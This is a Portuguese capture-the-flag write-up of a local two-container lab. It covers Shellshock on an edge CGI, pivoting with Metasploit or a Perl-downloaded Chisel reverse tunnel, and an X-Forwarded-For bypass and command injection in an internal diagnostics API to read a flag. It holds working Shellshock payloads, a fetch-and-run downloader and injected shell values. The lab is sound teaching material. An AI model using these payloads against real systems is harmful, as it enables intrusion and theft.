# Writeup — Atividade 2: Exploração

> **Contém spoilers.** Se ainda não tentou a atividade, comece pelo [README](README.md) e volte a este texto depois de explorar o laboratório por conta própria.

## Objetivo deste documento

Este writeup mostra o caminho de comprometimento de um ambiente de contêineres, composto por uma máquina de borda exposta e uma máquina interna isolada, do reconhecimento inicial até a obtenção da flag no contêiner interno.

O caminho mostrado não é o único possível. O writeup apresenta duas formas de criar o acesso e o pivô, **com Metasploit** e **sem Metasploit**, e reúne a exploração do serviço interno em uma seção comum.

## Índice

- [Visão geral](#visão-geral)
  - [Ambiente](#ambiente)
  - [Fluxo do ataque](#fluxo-do-ataque)
  - [Falhas exploradas](#falhas-exploradas)
  - [Dois caminhos](#dois-caminhos)
- [1. Reconhecimento](#1-reconhecimento)
- [2. Comprometimento da borda: Shellshock (CVE-2014-6271)](#2-comprometimento-da-borda-shellshock-cve-2014-6271)
- [3. Caminho com Metasploit](#3-caminho-com-metasploit)
- [4. Caminho sem Metasploit](#4-caminho-sem-metasploit)
- [5. Exploração do node-1 (netdiag)](#5-exploração-do-node-1-netdiag)
- [6. Obtenção da flag](#6-obtenção-da-flag)
- [7. Conclusão](#7-conclusão)
- [Fontes](#fontes)

## Visão geral

### Ambiente

O ambiente é composto por dois contêineres:

| Contêiner | Papel | Exposição | 
|---|---|---|
| `edge` (borda) | ponto de entrada e ponte para a rede interna | portas publicadas no host via Docker | 
| `node-1` (interno) | alvo final (flag) | nenhuma; só pela rede interna do Docker | 

O teste é conduzido localmente, sem necessidade de força bruta. O objetivo técnico é comprometer a borda, criar um pivô para a rede interna e obter a flag no `node-1`.

Ferramentas e comandos utilizados: `nmap`, `curl`, Docker (apenas para preparar e conferir as portas publicadas), Metasploit/Meterpreter, `proxychains`, `getent`, Chisel e `perl`. Os IPs dos contêineres nos exemplos são de uma execução específica; descubra os endereços da sua instância antes de reutilizar os comandos.

### Fluxo do ataque

As etapas do ataque, em ordem:

1. **Reconhecimento** da borda (`docker port`, `nmap`, HTTP).
2. **Shellshock (CVE-2014-6271)**, levando à execução de comandos como `www-data`.
3. **Descoberta do node-1** (via `getent` e o DNS do Docker) e **pivô** para a rede interna.
4. **Triagem de serviços internos** do node-1.
5. **Contorno de autorização** no netdiag (confiança no `X-Forwarded-For`).
6. **Injeção de comando** no parâmetro `target`, levando a RCE no node-1.
7. **Obtenção da flag.**

### Falhas exploradas

| # | Falha | Classe | Onde | O que permite |
|---|---|---|---|---|
| 1 | Shellshock (CVE-2014-6271) | Injeção de comando via variável de ambiente (CGI + Bash) | borda (Apache) | execução de comando como `www-data` |
| 2 | Confiança no cabeçalho `X-Forwarded-For` | Contorno de controle de acesso | node-1 (NetDiag) | alcançar o endpoint restrito `/api/diag` |
| 3 | Concatenação do parâmetro `target` no shell | Injeção de comando no SO | node-1 (netdiag) | execução de comandos arbitrários (RCE) |


### Dois caminhos

A exploração pode ser conduzida por dois métodos:

- **Com Metasploit:** o framework é usado para explorar o Shellshock, como canal de C2 (comando e controle) com a sessão do Meterpreter, e para o pivô. A sessão mantém o acesso ao alvo comprometido e permite rotear o tráfego para a rede interna.
- **Sem Metasploit:** usa o Shellshock para executar comandos e iniciar um túnel com utilitários disponíveis na borda (`perl`, `base64` e Chisel).

O reconhecimento, a falha Shellshock na borda e a exploração final do node-1 são os mesmos nos dois caminhos. O que muda é a forma de manter o canal de acesso e criar o pivô. Por isso, o Shellshock (seção 2) e a exploração do node-1 (seção 5) aparecem uma vez só.

## 1. Reconhecimento

O primeiro passo é entender o que a borda realmente expõe. Como o ambiente é local, podemos consultar diretamente o mapeamento de portas do contêiner de borda, para saber quais serviços internos estão publicados no host e em quais portas.

```console
$ docker port pacific-atividade2-edge-1
22/tcp -> 127.0.0.1:18081
80/tcp -> 127.0.0.1:18080
6379/tcp -> 127.0.0.1:18082
8081/tcp -> 127.0.0.1:18083
9100/tcp -> 127.0.0.1:18084

$ docker port pacific-atividade2-node-1-1
(sem retorno)
```


Após descobrir as portas, fazemos o reconhecimento de serviços e versões com `-sV`. Outras opções estão no [manual do Nmap](https://nmap.org/book/man-briefoptions.html).

```console
$ nmap -sV localhost -p18080-18084
PORT       STATE SERVICE VERSION
18080/tcp open  http    Apache httpd 2.4.68 ((Debian))
18081/tcp open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
18082/tcp open  unknown
18083/tcp open  http    Golang net/http server
18084/tcp open  http    Golang net/http server
```

O serviço na 18082 não é identificado pelo nmap; o fingerprint retornado remete a um Redis. A 18083 se identifica como `edge-api/2.3.1`, com endpoint `/v1/health`. Consolidando o que a borda expõe:

| Porta (host) | Porta (contêiner) | Serviço | Observação |
|---|---|---|---|
| 18080 | 80 | Apache httpd 2.4.68 | portal público + CGI  |
| 18081 | 22 | OpenSSH 9.6p1 | sem credenciais nesta fase |
| 18082 | 6379 | Redis | fingerprint remete a Redis |
| 18083 | 8081 | Go (`edge-api/2.3.1`) | endpoint `/v1/health` |
| 18084 | 9100 | Go net/http | serviço de métricas da borda |

O HTTP com CGI na 18080 é o vetor mais promissor. Os demais serviços da borda não deram evidência de execução remota; um banner ou número de versão, sozinho, não comprova vulnerabilidade.

A página inicial é um "Portal da Borda" público da Pacific Telecom, que informa que os serviços corporativos são restritos à rede interna e traz um link para um diagnóstico legado.

```console - máquina host
$ curl http://localhost:18080
<!doctype html>
<html lang="pt-br">
<head><meta charset="utf-8"><title>Pacific Telecom - Portal da Borda</title></head>
<body>
  <h1>Pacific Telecom</h1>
  <p>Portal público da borda. Serviços corporativos são restritos à rede interna.</p>
  <p>Status operacional: todos os sistemas normais.</p>
  <p><a href="/cgi-bin/status.cgi">Diagnóstico legado</a></p>
</body>
</html>
```

O link aponta para `/cgi-bin/status.cgi`. Ao executá-lo, o script responde com um diagnóstico:

```console - máquina host
$ curl http://localhost:18080/cgi-bin/status.cgi
edge-01 diagnostics
status: OK
date: Wed Oct  7 01:45:57 UTC 2026
```

Trata-se de um CGI servido pelo Apache. O caminho `/cgi-bin/` é uma pista, mas não prova Shellshock; a condição decisiva é o script invocar uma versão vulnerável do Bash após receber variáveis de ambiente derivadas da requisição.

## 2. Comprometimento da borda: Shellshock (CVE-2014-6271)

O Shellshock abusa da forma como versões vulneráveis do Bash tratavam funções exportadas em variáveis de ambiente. O Apache repassa cabeçalhos HTTP, como `User-Agent`, ao CGI por meio dessas variáveis. O prefixo `() { :;};` faz o Bash interpretar o valor como função; os comandos que vêm depois são executados indevidamente. O `echo;` produz uma linha em branco antes da saída do comando para separar os cabeçalhos do corpo da resposta HTTP.

Para validar o payload, enviamos um comando simples pelo `User-Agent`:

```console - máquina host
$ curl -H 'User-Agent: () { :;}; echo Content-Type: text/plain; echo; /usr/bin/id' http://localhost:18080/cgi-bin/status.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

O `id` confirma tanto a execução quanto o usuário obtido.

Com o retorno, a execução de comando foi confirmada.

> **Resultado da etapa:** execução de comando na borda como `www-data`. A partir daqui, os dois caminhos (seções 3 e 4) levam o mesmo acesso até o pivô para a rede interna, um com Metasploit e outro sem.

## 3. Caminho com Metasploit

Neste caminho, o Metasploit entrega a sessão de comando e controle e permite criar o pivô.

### 3.1. Foothold: sessão Meterpreter

Podemos utilizar o módulo `multi/http/apache_mod_cgi_bash_env_exec`, que automatiza a exploração e pode abrir uma sessão Meterpreter. Antes de executá-lo, identifique um endereço do controlador alcançável a partir da borda para configurar `LHOST`; `127.0.0.1` dentro do contêiner aponta para o próprio contêiner. O exemplo de saída abaixo foi obtido em uma execução específica.
 

```console - máquina host
$ msfconsole
$ msf > search shellshock
# exploit/multi/http/apache_mod_cgi_bash_env_exec   (Apache mod_cgi Bash Environment Variable Code Injection)
$ use exploit/multi/http/apache_mod_cgi_bash_env_exec

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts localhost
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rport 18080
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi cgi-bin/status.cgi
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set target 1
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload linux/x64/meterpreter/reverse_tcp
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost <IP_DO_CONTROLADOR_ALCANCAVEL_PELA_BORDA>
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
```
O comando `exploit` inicia a tentativa:
```
[*] Started reverse TCP handler on 172.17.69.122:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 172.22.0.2
[*] Meterpreter session 1 opened (172.17.69.122:4444 -> 172.22.0.2:42780)
```
Podemos validar a sessão iniciada com `sessions` e, dentro dela, `getuid`:
```
$ msf exploit(...) > sessions
Id  Type                   Information
1   meterpreter x64/linux  www-data @ 5278e79b25aa.localdomain
$ sessions 1
$ meterpreter > getuid
Server username: www-data
```

Notas de parametrização:

- `rhosts localhost` e `rport 18080` por causa do redirecionamento de porta do contêiner.
- Se sua versão do módulo rejeitar `TARGETURI` com barra inicial, informe `cgi-bin/status.cgi`. Algumas versões tratam essa opção de forma diferente.
- Poderíamos usar `setg` para definir esses valores de forma global, de modo que outros módulos que usem os mesmos parâmetros já os herdassem.

A sessão do Meterpreter serve como canal de C2: mantém o acesso à borda e, mais à frente, roteia o tráfego para a rede interna.

### 3.2. Descoberta do node-1

Na execução mostrada, a borda está ligada a duas redes: `172.22.0.2` na rede externa (`outside`) e `172.21.0.3` na rede interna (`inside`), compartilhada com o `node-1`. Esses endereços podem mudar quando o laboratório é recriado.

Usamos `getent hosts` na shell da borda para resolver `node-1` pela configuração de nomes dessa rede Docker:

```console - meterpreter
$ shell
$ getent hosts node-1
172.21.0.2   node-1
```

### 3.3. Pivô: autoroute e socks_proxy

Com o IP do alvo (`172.21.0.2`), precisamos de um pivô para que a máquina de ataque alcance o node-1 usando a borda como intermediária. Como já temos a sessão do Meterpreter, usamos o `autoroute` para criar a rota até a rede interna:

```console - shell da sessão Meterpreter
$ exit
```
```console -  meterpreter
$ meterpreter > run autoroute -s 172.21.0.0/24
[+] Added route to 172.21.0.0/255.255.255.0 via 172.22.0.2
```

A rota permite que módulos do Metasploit alcancem a rede interna pela sessão. Para usar ferramentas externas, iniciamos o módulo SOCKS e configuramos o `proxychains`. O comando `background` mantém a sessão ativa enquanto voltamos ao console do Metasploit.

```console - meterpreter
$ meterpreter > background
```
```console - msfconsole
$ msf exploit(...) > use auxiliary/server/socks_proxy
$ msf auxiliary(server/socks_proxy) > set VERSION 5
$ msf auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```
Na máquina de ataque, configure a lista de proxies usada pelo `proxychains`. O caminho do arquivo pode variar conforme a instalação; confira se a linha abaixo está na seção `[ProxyList]` e se o proxy do Metasploit está escutando em `127.0.0.1:1080`.
```console - máquina host
$ nano /etc/proxychains4.conf
[ProxyList]
socks5  127.0.0.1  1080
```

Ferramentas TCP compatíveis com SOCKS podem então alcançar o `node-1` por esse caminho. O roteamento configurado no `msfconsole` não altera a tabela de rotas do sistema operacional.

> **Resultado da etapa:** com o `autoroute` e o SOCKS proxy, a rede interna `172.21.0.0/24` (node-1 em `172.21.0.2`) fica alcançável a partir da máquina de ataque.

## 4. Caminho sem Metasploit

Aqui o mesmo resultado é obtido sem framework, só com o Shellshock, utilitários nativos e um túnel próprio.

### 4.1. Execução de comandos via Shellshock

O acesso pode ser operado sem framework: cada comando vai no `User-Agent` da requisição, como na confirmação da falha. Os comandos são executados como `www-data` no contêiner de borda:

```console - máquina host
$ curl -H "User-Agent: () { :;}; echo; <comando>" http://localhost:18080/cgi-bin/status.cgi
```

Essa é a requisição base que usamos para descobrir o `node-1` e iniciar o pivô.

### 4.2. Descoberta do node-1

A borda compartilha a rede interna `172.21.0.0/24` com o `node-1`; a rede `172.22.0.0/24` é a externa. Pelo Shellshock, `getent` resolve o endereço do `node-1` antes de iniciarmos o túnel:

```console -  máquina host
$ curl -H 'User-Agent: () { :;}; echo; /usr/bin/getent hosts node-1' http://localhost:18080/cgi-bin/status.cgi
172.21.0.2   node-1
```

### 4.3. Transferência do binário e pivô (Chisel)

Com o IP do alvo (`172.21.0.2` neste exemplo), precisamos de um pivô para alcançá-lo pela borda. Aqui usamos Chisel: o servidor fica na máquina de ataque e o cliente na borda. Antes, é preciso transferir um binário Chisel compatível com a arquitetura Linux x86-64 da borda. Outras ferramentas de túnel também podem cumprir esse papel.

Para fazer isso **sem Metasploit**, usamos o próprio Shellshock. A borda não tem `curl`, `wget` nem `python`, mas possui `perl`. Primeiro, sirva o binário na máquina de ataque, a partir do diretório em que está o arquivo `chisel`. O endereço do servidor precisa ser alcançável a partir da borda.

O Chisel cria um túnel entre o servidor na máquina de ataque e o cliente na borda. Projeto: [jpillora/chisel](https://github.com/jpillora/chisel).

```console - máquina host
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

O comando de download contém quebras de linha e outros caracteres inadequados para um cabeçalho HTTP. Por isso, montamos o script, codificamos em Base64 e o decodificamos na borda. O `perl` abre uma conexão TCP com o servidor da máquina de ataque, faz `GET /chisel` e grava o corpo da resposta em `/tmp/chisel`. Confira o endereço `172.22.0.1` na sua rede: ele é apenas o gateway usado nesta execução.

```console - máquina host
$ B64=$(cat <<'EOF' | base64 | tr -d '\n'
perl -e 'use IO::Socket::INET; $s=IO::Socket::INET->new(PeerAddr=>"172.22.0.1",PeerPort=>8081,Proto=>"tcp") or die $!; print $s "GET /chisel HTTP/1.0\r\nHost: x\r\n\r\n"; binmode $s; local $/; $d=<$s>; $d=~s/^.*?\r\n\r\n//s; open(F,">","/tmp/chisel") or die $!; binmode F; print F $d; close F;'
chmod +x /tmp/chisel
EOF
)
```
Enviamos a requisição e verificamos que o binário foi gravado com permissão de execução:

```console - máquina host
$ curl -H "User-Agent: () { :;}; echo; echo $B64 | /usr/bin/base64 -d | /usr/bin/bash" http://localhost:18080/cgi-bin/status.cgi
$ curl -H "User-Agent: () { :;}; echo; /bin/ls -l /tmp/chisel" http://localhost:18080/cgi-bin/status.cgi
-rwxr-xr-x 1 www-data www-data 9371800 Oct  9 05:16 /tmp/chisel
```

Na máquina de ataque, iniciamos o servidor Chisel em modo reverso. Mantenha esse terminal aberto:


```console - máquina host
$ chmod +x chisel
$ ./chisel server -p 8000 --reverse
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:8000
```

Na borda, iniciamos o cliente Chisel por uma nova requisição Shellshock. Redirecionamos entrada e saída e colocamos o processo em segundo plano; caso contrário, a requisição HTTP fica aberta enquanto o túnel estiver ativo:

```console - máquina host
$ curl -H "User-Agent: () { :;}; echo; /tmp/chisel client 172.22.0.1:8000 R:socks >/tmp/chisel.log 2>&1 </dev/null &" http://localhost:18080/cgi-bin/status.cgi
```

O servidor acusa a sessão estabelecida:

```console - máquina host
server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Confirmamos no terminal do servidor que o SOCKS reverso foi criado. Uma checagem dos processos na borda também deve mostrar o cliente `chisel`:

```console  - máquina host
$ curl -H 'User-Agent: () { :;}; echo; /bin/ps -ef' http://localhost:18080/cgi-bin/status.cgi
... /tmp/chisel client 172.22.0.1:8000 R:socks
```

Como no SOCKS do Metasploit, configure `socks5 127.0.0.1 1080` na seção `[ProxyList]` do `proxychains`. Para comprovar o canal de comando e controle nesta alternativa, registre o servidor Chisel, a conexão do cliente e uma tarefa enviada pelo túnel com sua resposta, por exemplo:

```console - máquina de ataque
$ proxychains curl http://172.21.0.2:8080/health
```

Essa consulta é um teste do caminho pela sessão Chisel; as requisições Shellshock anteriores serviram para instalar e iniciar o cliente na borda.


> **Resultado da etapa:** com o túnel do Chisel, a rede interna `172.21.0.0/24` (node-1 em `172.21.0.2`) fica alcançável a partir da máquina de ataque.

## 5. Exploração do node-1 (netdiag)

Desta etapa em diante, o procedimento é o mesmo nos dois caminhos: pelo pivô, enumeramos e exploramos o `node-1`.

### 5.1. Enumeração interna

A varredura do node-1 usa as portas reais do alvo (não o mapeamento 18080-18084, que é da borda). Fazemos um scan de serviços pelo pivô. Com `proxychains`, usamos `-sT` (TCP connect, que o proxychains intercepta) e `-Pn` (sem ping, que é pacote cru e não passa pelo proxy):

```console - máquina host
$ proxychains nmap -sT -Pn -sV 172.21.0.2
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
80/tcp   open  http    nginx 1.27.1
8080/tcp open  http    Golang net/http server
```

**HTTP de status (porta 80).** A página de monitoramento é somente leitura. O banner sugere `nginx 1.27.1`, mas não demonstra que essa versão real esteja instalada nem que exista uma falha explorável. O mesmo vale para o banner `vsFTPd 2.3.4` da porta 21; neste laboratório, o serviço é uma pista falsa e não abre o backdoor associado à versão.

**netdiag (porta 8080).** Aqui aparece algo interessante: um serviço interno de diagnóstico de rede, com rotas e um manual de uso.

```console - máquina host
$ proxychains curl http://172.21.0.2:8080
NetDiag - Internal Network Diagnostics Service (v1.4.2)

Endpoints:
  GET  /health      estado do servico
  GET  /api/status  status resumido da rede (publico)
  GET  /manual      manual da API
  POST /api/diag    executa um diagnostico (restrito a rede interna)

Os diagnosticos so podem ser disparados a partir da rede interna da organizacao.
Consulte /manual para o formato das requisicoes.
```

O manual detalha a chamada e traz uma seção de solução de problemas:

```console - máquina host
$ proxychains curl http://172.21.0.2:8080/manual
POST /api/diag
    Executa um diagnostico sobre um alvo. Corpo em JSON:
      { "target": "<host-ou-ip>", "type": "ping" }
    O campo target e obrigatorio. O campo type aceita ping ou lookup; padrao e lookup.

    Exemplo:
      curl -X POST http://netdiag.internal:8080/api/diag \
        -H 'Content-Type: application/json' \
        -d '{"target":"core-sw-01","type":"ping"}'

Solucao de problemas
- 403 "acesso restrito": a requisicao nao foi reconhecida como interna.
- 400: corpo invalido; verifique o campo "target".
```

### 5.2. Contorno de autorização via X-Forwarded-For

A exploração do NetDiag encadeia duas falhas distintas: primeiro, um contorno do controle de acesso, em que o serviço confia em um cabeçalho controlável pelo cliente; depois, uma injeção de comando no parâmetro `target`.

Reproduzimos a chamada do manual, trocando `netdiag.internal` pelo IP descoberto via `getent`. A requisição chega, mas recebe HTTP 403:

```console - máquina host
$ proxychains curl -i -X POST http://172.21.0.2:8080/api/diag -H 'Content-Type: application/json' -d '{"target":"core-sw-01","type":"ping"}'
HTTP/1.1 403 Forbidden
...
{"error":"acesso restrito","hint":"diagnosticos so podem ser executados a partir da rede interna"}
```

O `403` mostra que o serviço rejeitou a origem **como a interpretou**; não prova, por si só, que o tráfego deixou de passar pela rede interna. Testamos então a hipótese de que o NetDiag confia no cabeçalho `X-Forwarded-For` enviado pelo próprio cliente para decidir se a origem é interna. Informamos `127.0.0.1` nesse cabeçalho:


```console - máquina host
$ proxychains curl -X POST http://172.21.0.2:8080/api/diag -H 'Content-Type: application/json' -H "X-Forwarded-For: 127.0.0.1" -d '{"target":"core-sw-01","type":"ping"}'
{"output":"ping: bad address 'core-sw-01'\n","target":"core-sw-01","type":"ping"}
```

Contorno de autorização confirmado: ao apresentar `127.0.0.1` no `X-Forwarded-For`, o serviço aceita o diagnóstico. A falha está em confiar em um cabeçalho controlável pelo cliente.

### 5.3. Injeção de comando no parâmetro target (OS command injection)

Com o acesso ao endpoint liberado, investigamos `target`. O campo `type` aceita `ping` ou `lookup`; tentar encadear outro comando nele não passa pela validação. Já o valor de `target` é interpolado em uma chamada ao shell, como `ping <target>`. Por isso, inserimos um segundo comando em `target`:

```console
$ proxychains curl -X POST http://172.21.0.2:8080/api/diag -H 'Content-Type: application/json' -H "X-Forwarded-For: 127.0.0.1" -d '{"target":"127.0.0.1; whoami","type":"ping"}'
{"output":"PING 127.0.0.1 ... round-trip min/avg/max = 0.228/0.228/0.228 ms\nappsvc\n","target":"127.0.0.1; whoami","type":"ping"}
```

O `whoami` retorna `appsvc` após a saída do ping. Isso confirma a injeção de comando no sistema operacional. As falhas são distintas: o cabeçalho permite chegar ao endpoint restrito, e a injeção permite executar comandos pelo serviço.

### 5.4. Limpando a saída com jq

A resposta é JSON; ao imprimi-la diretamente no terminal, as quebras de linha do campo `output` aparecem escapadas como `\n`. O `jq -r` mostra esse campo como texto:

```console - máquina host
$ proxychains curl -s -X POST http://172.21.0.2:8080/api/diag \
    -H 'Content-Type: application/json' -H 'X-Forwarded-For: 127.0.0.1' \
    -d '{"target":"127.0.0.1; whoami","type":"ping"}' | jq -r .output
```

## 6. Obtenção da flag

Com execução de comandos no node-1 e sabendo o nome do arquivo, fazemos uma busca direcionada pela raiz, redirecionando os erros para não poluir a saída:

```console
$ proxychains curl -s -X POST http://172.21.0.2:8080/api/diag -H 'Content-Type: application/json' -H 'X-Forwarded-For: 127.0.0.1' -d '{"target":"127.0.0.1; find / -name flag.txt 2>/dev/null","type":"ping"}' | jq -r .output
...
/opt/netdiag/flag.txt
```

Com o caminho, basta repetir a requisição trocando o `find` por `cat`:

```console
$ proxychains curl -s -X POST http://172.21.0.2:8080/api/diag -H 'Content-Type: application/json' -H 'X-Forwarded-For: 127.0.0.1' -d '{"target":"127.0.0.1; cat /opt/netdiag/flag.txt","type":"ping"}' | jq -r .output
PING 127.0.0.1 ...
pacific{netdiag_a1a02191762a4ebc32836533}
```


## 7. Conclusão

Cadeia de exploração, do início à flag:

```
Recon da borda  ->  Shellshock no CGI (RCE como www-data)  ->  pivô para a rede interna
      ->  netdiag: contorno de autorização (X-Forwarded-For)  ->  injeção de comando no target (RCE)
      ->  flag em /opt/netdiag/flag.txt
```

A borda é comprometida através do Shellshock em um CGI legado servido pelo Apache. O acesso como `www-data` já é suficiente para enumerar o ambiente, descobrir o endereço do `node-1` e estabelecer um pivô; não há necessidade de elevação de privilégio neste módulo. Na rede interna, o `netdiag` confia no cabeçalho `X-Forwarded-For` para autorizar chamadas e concatena `target` em um comando de shell. O encadeamento leva à execução como `appsvc` e à flag em `/opt/netdiag/flag.txt`.

O comprometimento não vem de uma falha isolada, mas do encadeamento: a borda exposta permite o pivô de rede, e o netdiag permite a execução de comandos não autorizados. A demonstração do caminho com e sem Metasploit reforça o ponto central: o essencial é o raciocínio e a leitura do ambiente, não a ferramenta.

## Fontes

- [NVD — CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271).
- [Rapid7 — módulo Apache mod_cgi Bash Environment Variable Code Injection](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/).
- [Chisel — repositório e documentação](https://github.com/jpillora/chisel).
